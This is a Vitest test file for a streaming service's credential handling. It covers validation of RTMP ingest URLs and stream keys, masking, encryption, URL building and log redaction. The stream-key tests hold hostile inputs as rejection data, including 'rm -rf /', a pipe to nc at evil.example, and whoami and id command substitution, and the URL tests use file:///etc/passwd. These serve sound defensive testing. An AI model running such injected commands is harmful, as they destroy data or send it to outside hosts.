import { describe, it, expect, beforeAll } from "vitest";
import {
  validateRtmpUrl,
  validateStreamKey,
  maskStreamKey,
  encryptStreamKey,
  decryptStreamKey,
  maskStoredStreamKey,
  buildIngestUrl,
  redactStreamKeys,
} from "./socialCredentials.js";

beforeAll(() => {
  process.env.SECRETS_ENCRYPTION_KEY ||= "test-key-for-social-credentials";
});

/**
 * The stream key is the value that lets someone broadcast as BoiAro, so these
 * tests are about what must NOT get through rather than what must.
 */
describe("ingest URL validation", () => {
  it("accepts the real ingest endpoints of both platforms", () => {
    for (const url of [
      "rtmp://a.rtmp.youtube.com/live2",
      "rtmps://a.rtmps.youtube.com:443/live2",
      "rtmps://live-api-s.facebook.com:443/rtmp",
      "rtmp://a.rtmp.youtube.com:1935/live2",
    ]) {
      expect(validateRtmpUrl(url), url).toEqual({ ok: true });
    }
  });

  it("rejects protocols that are not rtmp", () => {
    for (const url of ["http://example.com/live", "https://example.com/live", "file:///etc/passwd", "srt://example.com:9000"]) {
      expect(validateRtmpUrl(url).ok, url).toBe(false);
    }
  });

  it("rejects a value ffmpeg would read as an option", () => {
    expect(validateRtmpUrl("-i").ok).toBe(false);
    expect(validateRtmpUrl("-f rtmp://a.rtmp.youtube.com/live2").ok).toBe(false);
  });

  it("rejects credentials smuggled into the URL", () => {
    expect(validateRtmpUrl("rtmp://user:secret@a.rtmp.youtube.com/live2").ok).toBe(false);
  });

  it("rejects query strings, fragments and odd path characters", () => {
    expect(validateRtmpUrl("rtmp://a.rtmp.youtube.com/live2?x=1").ok).toBe(false);
    expect(validateRtmpUrl("rtmp://a.rtmp.youtube.com/live2#f").ok).toBe(false);
    expect(validateRtmpUrl("rtmp://a.rtmp.youtube.com/live 2").ok).toBe(false);
  });

  it("rejects an empty or over-long URL", () => {
    expect(validateRtmpUrl("").ok).toBe(false);
    expect(validateRtmpUrl("rtmp://a.rtmp.youtube.com/" + "a".repeat(600)).ok).toBe(false);
  });
});

describe("stream key validation", () => {
  it("accepts keys in the shapes the platforms actually issue", () => {
    for (const key of [
      "abcd-1234-efgh-5678-ijkl",
      "FB-1234567890123456-0-AbCdEfGhIjKlMnOp",
      "xy12zw34ab56cd78",
    ]) {
      expect(validateStreamKey(key), key).toEqual({ ok: true });
    }
  });

  it("rejects a key that would be read as an ffmpeg option", () => {
    expect(validateStreamKey("-loglevel").ok).toBe(false);
  });

  it("rejects shell metacharacters and whitespace", () => {
    for (const key of [
      "abcd1234; rm -rf /",
      "abcd1234 | nc evil.example 1234",
      "abcd1234`whoami`",
      "abcd1234$(id)",
      "abcd 1234 5678",
      "abcd1234'quoted'",
    ]) {
      expect(validateStreamKey(key).ok, key).toBe(false);
    }
  });

  it("rejects keys that are empty, too short, or absurdly long", () => {
    expect(validateStreamKey("").ok).toBe(false);
    expect(validateStreamKey("short").ok).toBe(false);
    expect(validateStreamKey("a".repeat(513)).ok).toBe(false);
  });

  it("never repeats the offending value back in the error message", () => {
    const secret = "abcd1234;rm -rf /";
    const result = validateStreamKey(secret);
    expect(result.ok).toBe(false);
    expect(result.error).not.toContain(secret);
  });
});

describe("masking", () => {
  it("shows enough to tell two keys apart but not enough to use one", () => {
    const masked = maskStreamKey("abcd-1234-efgh-5678-ijkl");
    expect(masked).toBe("abcd••••••••jkl");
    expect(masked).not.toContain("1234-efgh");
  });

  it("masks a short key completely rather than partially", () => {
    expect(maskStreamKey("short12345")).toBe("••••••••");
  });

  it("returns nothing for a missing key", () => {
    expect(maskStreamKey("")).toBe("");
    expect(maskStreamKey(null)).toBe("");
    expect(maskStreamKey(undefined)).toBe("");
  });
});

describe("encryption round trip", () => {
  it("stores the key unreadable and gets it back intact", () => {
    const plain = "abcd-1234-efgh-5678-ijkl";
    const stored = encryptStreamKey(plain);
    expect(stored).not.toContain(plain);
    expect(stored.startsWith("enc:v1:")).toBe(true);
    expect(decryptStreamKey(stored)).toBe(plain);
  });

  it("masks straight from storage without exposing the plaintext", () => {
    const stored = encryptStreamKey("abcd-1234-efgh-5678-ijkl");
    expect(maskStoredStreamKey(stored)).toBe("abcd••••••••jkl");
  });
});

describe("building the ingest URL", () => {
  it("joins the URL and key into one argument", () => {
    expect(buildIngestUrl("rtmps://a.rtmps.youtube.com:443/live2", "abcd-1234-efgh-5678")).toBe(
      "rtmps://a.rtmps.youtube.com:443/live2/abcd-1234-efgh-5678"
    );
  });

  it("tolerates a trailing slash on the ingest URL", () => {
    expect(buildIngestUrl("rtmp://a.rtmp.youtube.com/live2/", "abcd-1234-efgh-5678")).toBe(
      "rtmp://a.rtmp.youtube.com/live2/abcd-1234-efgh-5678"
    );
  });

  it("refuses to build anything from an unvalidated value", () => {
    expect(() => buildIngestUrl("http://evil.example/x", "abcd-1234-efgh-5678")).toThrow();
    expect(() => buildIngestUrl("rtmp://a.rtmp.youtube.com/live2", "-loglevel")).toThrow();
  });
});

describe("log redaction", () => {
  it("strips the key out of a platform error that quotes the full URL", () => {
    const line = "Connection to rtmps://a.rtmps.youtube.com:443/live2/abcd-1234-efgh-5678 failed";
    const safe = redactStreamKeys(line);
    expect(safe).not.toContain("abcd-1234-efgh-5678");
    expect(safe).toContain("rtmps://a.rtmps.youtube.com:443/live2/***REDACTED***");
  });
});
